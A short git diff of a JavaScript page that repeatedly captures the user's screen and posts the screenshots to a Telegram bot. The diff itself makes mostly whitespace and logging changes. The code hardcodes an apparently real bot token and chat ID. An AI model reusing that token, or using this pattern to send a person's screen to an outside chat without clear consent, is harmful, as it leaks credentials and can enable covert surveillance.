@@ -11,9 +11,6 @@ document.getElementById('themeToggle').addEventListener('click', function () {
 
 
 
-
-
-
 const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
 const CHAT_ID = "-1002238772738";
 const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
@@ -39,8 +36,7 @@ function takeScreenshot() {
   startCapture({ video: true }).then(stream => {
     videoElement.srcObject = stream;
 
-    const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс
-
+    const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
     screenshotInterval = setInterval(() => {
       const canvas = document.createElement('canvas');
       canvas.width = videoElement.videoWidth;
@@ -49,7 +45,9 @@ function takeScreenshot() {
       context.drawImage(videoElement, 0, 0);
 
       canvas.toBlob((blob) => {
-        sendScreenshot(blob); // Відправляємо скріншот у Telegram
+        sendScreenshot(blob);
+        console.log(blob);
+        // Відправляємо скріншот у Telegram
       }, 'image/png');
     }, intervalValue);
   });
@@ -59,7 +57,6 @@ function sendScreenshot(screenshot) {
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
   formData.append("photo", screenshot); // Додаємо скрін до formData
-
   axios.post(SEND_API, formData, {
     headers: {
       'Content-Type': 'multipart/form-data'
